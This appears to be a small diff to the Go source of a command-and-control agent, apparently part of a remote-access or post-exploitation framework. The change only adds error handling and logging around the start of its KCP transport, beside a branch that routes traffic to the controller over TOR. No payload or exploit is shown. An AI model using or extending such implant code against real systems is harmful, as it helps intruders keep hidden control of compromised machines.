@@ -125,7 +125,11 @@ func agent_main() {
 		logging.Infof("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	} else if common.RuntimeConfig.UseKCP {
 		// run KCP
-		go c2transport.RunKCPClient() // KCP client will run when UseKCP is set
+		go func() {
+			if err := c2transport.RunKCPClient(); err != nil {
+				logging.Errorf("KCP transport unavailable: %v", err)
+			}
+		}()
 	}
 	logging.Infof("CCAddress is: %s", def.CCAddress)
 
